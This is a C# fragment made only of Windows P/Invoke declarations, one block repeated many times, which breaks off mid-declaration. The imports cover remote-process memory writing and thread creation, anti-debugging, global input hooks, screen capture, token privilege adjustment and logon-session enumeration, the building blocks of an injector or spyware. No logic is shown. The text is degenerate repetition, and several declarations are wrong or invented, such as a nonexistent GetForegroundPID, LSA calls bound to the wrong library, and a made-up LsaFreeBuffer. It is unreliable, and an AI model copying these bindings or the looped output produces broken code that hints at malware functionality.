        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
